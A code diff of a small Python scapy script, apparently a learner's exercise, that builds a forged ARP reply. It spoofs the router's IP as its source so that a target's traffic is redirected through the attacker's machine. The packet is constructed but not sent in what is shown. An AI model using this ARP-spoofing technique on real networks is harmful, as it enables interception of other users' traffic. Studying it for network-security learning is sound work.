@@ -1,11 +1,13 @@
 #/usr/bin/env python
-
 from scapy.layers.l2 import ARP
 
-# Create ARP Packet Response.  network_scanner created an ARP Request.
-# op (operation) value 1 (who has X). op value 2 is an ARP Reply
-# where the target responds with its MAC Address.
-# The next value set is pdst, ip address of target computer.
-# I got this value by doing a network_scanner.py on interface eth0 IP
-# The next value is the target MAC Address hwdst, which in my case is our default gateway (??).
-packet = ARP(op=2, pdst="192.168.1.123", hwdst="60:45:e8:31:e5:23" )
+# Create an ARP **Response**, to redirect the flow of packets through our computer.
+# We need fields:
+# op value 2: Sets ARP Reply (target responds with MAC Address).
+# "pdst", IP Address target computer.
+# For me I ran "network_scanner" on "eth0" IP.
+# Next target MAC, default gateway(??): hwdst = [TARGET_MAC_ADDRESS].
+# Finally, set source packet - source my computer
+# To tell target source is from the router.
+# **route -n** returns the IP of the router (default gateway).
+packet = ARP(op=2, pdst="192.168.1.123", hwdst="60:45:e8:31:e5:23", psrc="192.168.1.254" )
